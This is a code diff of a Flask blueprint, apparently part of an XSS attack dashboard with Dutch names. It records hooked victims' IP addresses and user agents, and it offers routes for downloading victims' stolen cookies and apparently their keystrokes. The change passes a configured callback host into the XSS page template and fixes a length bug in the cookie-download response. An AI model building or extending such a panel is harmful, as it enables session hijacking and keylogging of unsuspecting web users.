@@ -5,11 +5,12 @@ from datetime import date
 import hashlib
 import calendar
 import datetime
+
  
 
 vandaag = date.today()
 
-
+appdata = db_instellingen.query.first()
 
 xxs_bp = Blueprint('xxs_bp', __name__,
                     template_folder='html',
@@ -29,7 +30,7 @@ def xss_hooked():
             bevdb = db_xxs_hooked(ip=ip, agent=ua, md5=md5.hexdigest())
             db.session.add(bevdb)
             db.session.commit()
-        pagina = render_template('xss.html')
+        pagina = render_template('xss.html', localhost=appdata.localhost)
     else:
         pagina = render_template('xss-blanco.html', localhost='http://localhost')
 
@@ -164,7 +165,7 @@ def xxs_download_cookies(id):
         'Cache-Control': 'private',
         'Content-type': 'application/text',
         'Content-Disposition': 'attachment; filename="cookies_'+x.ip+'.txt"',
-        'Content-Length': str(len(header+waarde,))}
+        'Content-Length': str(len(header+waarden))}
 
 @xxs_bp.route("/dashboard/xxs/download_toetsen/<int:id>", methods=["GET", "POST"])
 def xxs_download_toetsen(id):
